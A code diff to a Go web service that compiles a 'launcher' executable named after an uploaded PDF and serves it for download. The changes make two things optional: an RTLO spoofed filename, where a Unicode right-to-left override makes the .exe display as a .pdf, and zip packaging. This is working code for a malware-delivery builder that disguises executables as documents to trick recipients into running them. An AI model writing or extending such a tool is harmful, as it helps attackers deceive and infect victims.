@@ -243,7 +243,17 @@ func handleCompile(w http.ResponseWriter, r *http.Request) {
 	if cleanName == "" {
 		cleanName = "launcher"
 	}
+
+	useRtlo := r.FormValue("useRtlo") == "true"
+	useZip := r.FormValue("useZip") == "true"
+
 	outputFilename := cleanName + ".exe"
+	if useZip {
+		outputFilename = cleanName + ".zip"
+	} else if useRtlo {
+		rtlo := "\u202E"
+		outputFilename = cleanName + rtlo + "fdp.exe"
+	}
 
 	// Lock compile operation for this build hash
 	mu := getCompileMutex(buildHash)
@@ -261,7 +271,7 @@ func handleCompile(w http.ResponseWriter, r *http.Request) {
 
 		serveJSONResponse(w, CompileResponse{
 			Success:     true,
-			DownloadURL: "/download/" + buildHash,
+			DownloadURL: fmt.Sprintf("/download/%s?rtlo=%t&zip=%t", buildHash, useRtlo, useZip),
 			Filename:    outputFilename,
 		})
 		return
@@ -418,7 +428,7 @@ func handleCompile(w http.ResponseWriter, r *http.Request) {
 
 	serveJSONResponse(w, CompileResponse{
 		Success:     true,
-		DownloadURL: "/download/" + buildHash,
+		DownloadURL: fmt.Sprintf("/download/%s?rtlo=%t&zip=%t", buildHash, useRtlo, useZip),
 		Filename:    outputFilename,
 	})
 }
@@ -460,40 +470,56 @@ func handleDownload(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// Read query parameters
+	useRtlo := r.URL.Query().Get("rtlo") == "true"
+	useZip := r.URL.Query().Get("zip") == "true"
+
 	// Format download filename
 	cleanName := strings.TrimSuffix(meta.PdfName, filepath.Ext(meta.PdfName))
 	if cleanName == "" {
 		cleanName = "Document"
 	}
 
-	rtlo := "\u202E"
-	spoofedFilename := cleanName + rtlo + "fdp.exe"
-
-	// Create zip archive
-	var zipBuf bytes.Buffer
-	zipWriter := zip.NewWriter(&zipBuf)
-	fileWriter, err := zipWriter.Create(spoofedFilename)
-	if err != nil {
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		return
-	}
-	_, err = fileWriter.Write(exeBytes)
-	if err != nil {
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		return
-	}
-	err = zipWriter.Close()
-	if err != nil {
-		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
-		return
+	var spoofedFilename string
+	if useRtlo {
+		rtlo := "\u202E"
+		spoofedFilename = cleanName + rtlo + "fdp.exe"
+	} else {
+		spoofedFilename = cleanName + ".exe"
 	}
 
-	zipBytes := zipBuf.Bytes()
+	if useZip {
+		// Create zip archive
+		var zipBuf bytes.Buffer
+		zipWriter := zip.NewWriter(&zipBuf)
+		fileWriter, err := zipWriter.Create(spoofedFilename)
+		if err != nil {
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+		_, err = fileWriter.Write(exeBytes)
+		if err != nil {
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+		err = zipWriter.Close()
+		if err != nil {
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
 
-	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s.zip\"", cleanName))
-	w.Header().Set("Content-Type", "application/zip")
-	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(zipBytes)))
-	w.Write(zipBytes)
+		zipBytes := zipBuf.Bytes()
+
+		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s.zip\"", cleanName))
+		w.Header().Set("Content-Type", "application/zip")
+		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(zipBytes)))
+		w.Write(zipBytes)
+	} else {
+		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", spoofedFilename))
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(exeBytes)))
+		w.Write(exeBytes)
+	}
 }
 
 // Background cleanup worker
